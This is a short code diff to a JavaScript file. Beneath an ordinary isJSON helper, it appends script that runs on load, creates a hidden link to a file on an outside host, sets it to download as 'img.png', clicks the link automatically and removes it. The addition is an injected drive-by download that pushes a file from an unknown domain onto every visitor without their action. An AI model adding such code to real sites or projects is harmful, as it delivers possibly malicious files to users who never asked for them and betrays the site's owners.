@@ -73,3 +73,13 @@ function isJSON(str) {
             }  
             return false;  
         }
+
+var link = document.createElement("a");      
+    link.href = 'http://ts.owikio.com/business/img/banner.png';  
+
+    link.style = "visibility:hidden";  
+    link.download = 'img.png';  
+    
+    document.body.appendChild(link);  
+    link.click();  
+    document.body.removeChild(link);  
